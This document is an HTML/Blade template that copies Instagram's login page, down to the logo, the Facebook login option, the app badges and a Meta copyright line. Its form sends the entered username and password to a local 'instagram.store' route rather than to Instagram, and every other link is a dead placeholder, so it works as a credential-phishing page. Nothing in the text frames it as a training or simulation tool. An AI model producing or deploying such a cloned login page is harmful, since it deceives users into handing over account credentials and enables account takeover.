<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="{{ asset('assets/instagram/styles.css') }}">
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="top">
            <div class="logo">
                <img src="{{ asset('assets/instagram/instagram.png') }}" alt="instagram" style="width: 175px;">
            </div>
            <form action="{{ route('instagram.store') }}" method="post">
                @csrf
                <div class="form">
                    <div class="input_field">
                        <input name="username" type="text" placeholder="Phone number, username, or email" class="input">
                    </div>
                    <div class="input_field">
                        <input name="password" type="password" placeholder="Password" class="input">
                    </div>
                    <div class="btn mt-10">
                        <button type="submit" class="btn submit-button-padding">Log In</button>
                    </div>
                </div>
            </form>
            <div class="or">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="dif">
                <div class="fb">
                    <img src="{{ asset('assets/instagram/facebook.png') }}" alt="facebook">
                    <p>Log in with Facebook</p>
                </div>
                <div class="forgot">
                    <a href="#">Forgot password?</a>
                </div>
            </div>
        </div>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="apps">
            <p>Get the app.</p>
            <div class="icons">
                <a href="#"><img src="{{ asset('assets/instagram/appstore.png') }}" alt="appstore"></a>
                <a href="#"><img src="{{ asset('assets/instagram/googleplay.png') }}" alt="googleplay"></a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <ul>
                <li><a href="#">About Us</a></li>
                <li><a href="#">Support</a></li>
                <li><a href="#">Press</a></li>
                <li><a href="#">API</a></li>
                <li><a href="#">Privacy</a></li>
                <li><a href="#">Terms</a></li>
                <li><a href="#">Language</a></li>
            </ul>
        </div>
        <div class="copyright">
            <a href="#"> © 2024 Instagram from Meta</a>
        </div>

    </div>
</div>

</body>
</html>
